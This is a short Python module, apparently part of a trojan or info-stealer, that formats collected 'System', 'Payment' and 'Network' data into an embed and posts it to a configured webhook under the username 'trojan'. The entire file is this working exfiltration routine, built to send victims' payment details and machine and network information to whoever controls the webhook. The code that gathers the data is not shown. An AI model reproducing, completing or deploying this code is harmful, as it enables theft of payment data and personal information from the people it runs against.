from config import webhook_url
import json
import requests



def send_webhook(system, payment, network):
    if webhook_url == "":
        return
    
    #elif None in (system, payment, network):
    #    return
    
    
    headers = {
        'Content-Type': 'application/json',
    }
    
    system_info  = "\n".join({"%s : **%s**" % (key, value) for key, value in system.items()})
    payment_info = "\n".join({"%s : **%s**" % (key, value) for key, value in payment.items()})
    network_info = "\n".join({"%s : **%s**" % (key, value) for key, value in network.items()})
    
    
    embeds = [
        {   
            "fields":[
                {
                    "name":"System",
                    "value":system_info,
                    "inline":True
                },
                {
                    "name":"Payment",
                    "value":payment_info,
                    "inline":True
                },
                {
                    "name":"Network",
                    "value":network_info,
                    "inline":True
                },
            ]
            
        }
    ] 
    
    payload = json.dumps(
        {
            "username":"trojan",
            "embeds":embeds
        }
    )

    try:
        response = requests.post(webhook_url, payload, headers=headers)
        print(response.status_code)
    except Exception as e:
        print(e)

